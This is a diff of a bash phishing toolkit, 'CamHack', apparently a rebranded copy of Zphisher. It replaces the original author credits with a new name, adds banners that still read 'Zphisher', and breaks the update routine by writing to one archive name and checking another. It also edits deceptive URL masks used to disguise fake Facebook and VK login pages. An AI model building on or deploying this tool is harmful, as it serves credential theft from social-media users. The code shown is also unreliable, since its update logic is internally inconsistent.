@@ -1,10 +1,9 @@
 #!/bin/bash
 
-##   camhack 	: 	Automated Phishing Tool
-##   Author 	: 	Ali Haider 
+##   CamHack 	: 	Automated Phishing Tool
+##   Author 	: 	Ali Haider
 ##   Version 	: 	2.3.5
 ##   Github 	: 	https://github.com/alihaider998/camhack
-
 
 ##                   GNU GENERAL PUBLIC LICENSE
 ##                    Version 3, 29 June 2007
@@ -76,11 +75,12 @@
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
 ##
-##      Copyright (C) 2022  HTR-TECH (https://github.com/ALIHAIDER998)
+##      Copyright (C) 2022  HTR-TECH (https://github.com/alihaider998)
 ##
 
 ##   THANKS TO :
-##   Ali Haider Nakokara - https://github.com/ALIHAIDER998
+##   Ali Haider Nakokara - https://github.com/alihaider998
+
 
 
 __version__="2.3.5"
@@ -167,12 +167,12 @@ check_update(){
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".camhack.tar.gz" "${tarball_url}"
+		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
 
 		if [[ -e ".camhack.tar.gz" ]]; then
 			tar -xf .camhack.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
 			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .zphisher.tar.gz
+			rm -f .camhack.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
 			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run camhack again\n\n"${WHITE}
@@ -191,6 +191,33 @@ check_status() {
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
 	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
+}
+
+## Banner
+banner() {
+	cat <<- EOF
+		${ORANGE}
+		${ORANGE} ______      _     _     _               
+		${ORANGE}|___  /     | |   (_)   | |              
+		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
+		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
+		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
+		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
+		${ORANGE}      | |                                
+		${ORANGE}      |_|                ${RED}Version : ${__version__}
+
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by alihaider998 (ali.haider)${WHITE}
+	EOF
+}
+
+## Small Banner
+banner_small() {
+	cat <<- EOF
+		${BLUE}
+		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
+		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
+		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+	EOF
 }
 
 ## Dependencies
@@ -315,7 +342,7 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
+		${GREEN} Author   ${RED}:  ${ORANGE}Ali Haider ${RED}[ ${ORANGE}alihaider998 ${RED}]
 		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/alihaider998
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
@@ -325,9 +352,7 @@ about() {
 		  any misuse of this toolkit ${RED}!${WHITE}
 		
 		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
-		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
-		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
-		  Yisus7u7
+		${GREEN}  Ali Haider
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -593,7 +618,7 @@ site_facebook() {
 			tunnel_menu;;
 		3 | 03)
 			website="fb_security"
-			mask='https://make-your-facebook-secured-and-free-from-hackers'
+			mask='https://make-your-facebook-secured'
 			tunnel_menu;;
 		4 | 04)
 			website="fb_messenger"
@@ -686,7 +711,7 @@ site_vk() {
 	case $REPLY in 
 		1 | 01)
 			website="vk"
-			mask='https://vk-premium-real-method-2020'
+			mask='https://vk-premium-real-method-2026'
 			tunnel_menu;;
 		2 | 02)
 			website="vk_poll"
